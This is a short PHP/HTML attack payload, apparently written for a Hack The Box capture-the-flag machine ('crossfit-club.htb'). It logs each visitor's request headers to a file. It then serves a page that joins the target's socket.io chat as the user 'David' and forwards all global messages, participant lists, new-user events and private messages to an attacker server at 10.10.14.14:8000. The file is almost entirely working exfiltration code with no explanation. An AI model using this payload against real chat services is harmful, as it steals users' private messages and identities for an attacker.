<?php
$h = $_SERVER;
//echo  print_r($h, true);
file_put_contents('test.out',print_r($h, true));

echo '<html>
<script src="http://10.10.14.14:8000/socket.io.min.js"></script>
<script>
	var socket=io.connect("http://crossfit-club.htb");
	socket.emit("user_join", { "username" : "David"});
	socket.on("recv_global", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/recv_global/" + JSON.stringify(data), true);
		xhr.send();
	});
	
	socket.on("participants", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/participants/" + JSON.stringify(data), true);
		xhr.send();
	});
	
	socket.on("new_user", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/new_user/" + JSON.stringify(data), true);
		xhr.send();
	});
	
	socket.on("private_recv", (data) => {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://10.10.14.14:8000/private_recv/" + JSON.stringify(data), true);
		xhr.send();
	});
	</script>
</html>'

?>